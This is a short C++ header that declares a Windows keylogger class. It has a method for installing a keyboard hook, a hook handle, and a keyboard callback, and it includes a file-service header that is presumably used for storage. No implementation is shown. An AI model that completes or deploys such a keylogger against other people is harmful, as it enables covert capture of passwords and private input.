#pragma once

#include <Windows.h>
#include <tchar.h>
#include <string>
#include "FileService.h"

#ifndef UNICODE
#define UNICODE
#endif // !UNICODE

class Keylogger
{
public:
	BOOLEAN TrySetHook();
	//Keylogger();

private:
	HHOOK hHook;
	static LRESULT CALLBACK KeyboardProc(IN int code, IN WPARAM wParam, IN LPARAM lParam);
};

